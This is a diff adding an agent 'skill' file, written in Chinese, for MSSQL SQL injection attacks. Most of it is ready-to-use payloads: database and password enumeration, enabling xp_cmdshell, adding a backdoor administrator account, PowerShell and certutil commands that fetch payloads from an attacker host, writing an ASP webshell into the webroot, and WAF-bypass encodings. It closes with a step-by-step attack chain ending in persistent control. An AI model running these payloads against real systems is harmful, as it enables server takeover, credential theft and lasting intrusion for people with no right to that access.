@@ -1,0 +1,140 @@
+---
+name: sqli-mssql
+description: Use when encountering mssql数据库注入攻击技术
+---
+
+# SQL注入攻击
+
+## Info
+
+- **Domain**: web
+- **Tags**: web, sqli, mssql, database
+
+# MSSQL注入攻击
+
+## 攻击思路
+```
+探测注入点 → 获取版本/权限 → 枚举数据库结构 → 提取数据 → xp_cmdshell执行命令 → 提权持久化
+```
+
+## MSSQL特性函数
+
+| 函数 | 用途 |
+|------|------|
+| @@version | 版本信息 |
+| user_name() | 当前用户 |
+| suser_name() | 登录用户 |
+| db_name() | 当前数据库 |
+| system_user | 系统用户名 |
+| is_srvrolemember('sysadmin') | 检查管理员权限 |
+
+## 信息收集Payload
+
+```sql
+-- 版本
+' UNION SELECT 1,@@version,3--
+' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
+
+-- 用户权限
+' UNION SELECT 1,user_name(),is_srvrolemember('sysadmin')--
+
+-- 数据库列表
+' UNION SELECT name,dbid,0 FROM master..sysdatabases--
+' UNION SELECT name,0,0 FROM sys.databases--
+
+-- 表名枚举
+' UNION SELECT name,0,0 FROM sysobjects WHERE xtype='U'--
+' UNION SELECT table_name,0,0 FROM information_schema.tables WHERE table_type='BASE TABLE'--
+
+-- 列名枚举
+' UNION SELECT column_name,0,0 FROM information_schema.columns WHERE table_name='users'--
+```
+
+## xp_cmdshell命令执行
+
+### 检测与开启
+```sql
+-- 检测是否存在
+'; EXEC master..xp_cmdshell 'whoami'--
+
+-- 开启xp_cmdshell
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+
+-- 检查是否开启
+' UNION SELECT 1,(SELECT config_value FROM sys.configurations WHERE name='xp_cmdshell'),3--
+```
+
+### 命令执行
+```sql
+'; EXEC master..xp_cmdshell 'whoami'--
+'; EXEC master..xp_cmdshell 'net user hacker password /add'--
+'; EXEC master..xp_cmdshell 'net localgroup administrators hacker /add'--
+'; EXEC master..xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).downloadString("http://attacker/shell.ps1")'--
+```
+
+### 写入WebShell
+```sql
+'; EXEC xp_cmdshell 'echo ^<%execute(request("cmd"))^%> > C:\inetpub\wwwroot\shell.asp'--
+'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
+```
+
+## SP_OACREATE替代方案
+
+```sql
+-- 开启Ole Automation
+'; EXEC sp_configure 'Ole Automation Procedures',1; RECONFIGURE;--
+
+-- 创建WScript.Shell对象
+'; DECLARE @shell INT; EXEC SP_OACREATE 'wscript.shell',@shell OUTPUT;
+'; EXEC SP_OAMETHOD @shell,'run',NULL,'cmd /c whoami > C:\output.txt';--
+
+-- 文件操作
+'; DECLARE @f INT; EXEC SP_OACREATE 'Scripting.FileSystemObject',@f OUTPUT;
+'; EXEC SP_OAMETHOD @f,'CopyFile',NULL,'C:\source.txt','C:\dest.txt';--
+```
+
+## WAF绕过技术
+
+| 绕过方法 | Payload示例 |
+|----------|-------------|
+| 内联注释 | /**/UNION/**/SELECT/**/ |
+| Hex编码 | 0x756e696f6e |
+| URL编码 | %55%4e%49%4f%4e |
+| NULL字节 | UN%00ION SELECT |
+| 堆叠执行 | EXEC('xp_cmdshell ''whoami''') |
+
+```sql
+-- 编码绕过
+'; EXEC('EXEC xp_cmdshell ''whoami''')--
+'; DECLARE @c VARCHAR(255); SET @c=0x77686f616d69; EXEC xp_cmdshell @c;--
+
+-- 动态SQL
+'; DECLARE @sql NVARCHAR(4000); SET @sql=N'xp_cmdshell ''whoami'''; EXEC sp_executesql @sql;--
+```
+
+## 数据提取优化
+
+```sql
+-- TOP分页
+' UNION SELECT TOP 1 username,password,3 FROM users--
+' UNION SELECT TOP 1 username FROM users WHERE username NOT IN (SELECT TOP 1 username FROM users)--
+
+-- 字符拼接
+' UNION SELECT username+':'+password,0,0 FROM users--
+
+-- Hex编码输出
+' UNION SELECT master.dbo.fn_varbintohexstr(CAST(password AS VARBINARY)),0,0 FROM users--
+```
+
+## 攻击链完整流程
+
+```
+1. 探测注入类型(报错/盲注/联合)
+2. 检查当前用户权限(is_srvrolemember)
+3. 若sysadmin → 直接xp_cmdshell
+4. 若非sysadmin → 將试开启xp_cmdshell
+5. 若xp_cmdshell被禁 → SP_OACREATE替代
+6. 若两者都禁 → 寻找其他存储过程
+7. 写入WebShell → 持久化控制
+```
